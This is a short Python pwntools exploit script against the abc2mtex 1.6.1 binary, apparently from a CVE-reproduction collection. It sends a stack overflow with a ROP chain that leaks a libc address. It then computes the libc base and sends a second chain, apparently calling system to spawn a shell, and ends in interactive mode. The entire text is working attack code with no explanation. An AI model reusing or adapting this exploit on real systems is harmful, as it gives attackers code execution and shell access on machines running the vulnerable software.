from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/CVE/abc2mtex_1_6_1/abc2mtex")
pwn.gdb.attach(p)
#p.recvuntil(b'\nselect tunes: ')
payload = b"\x00" * 248
payload += p64(0x400b16) + p64(0x40ceb3) + p64(0x60fff0) + p64(0x400b80) + p64(0x40ceb3) + p64(0x610f80) + p64(0x400c60) + p64(0x400d78) + p64(0x610f78) + p64(0x400fff)
payload += b"\n"
p.send(payload)
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x40ceb3) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
payload += b"\n"
p.send(payload)
p.interactive()
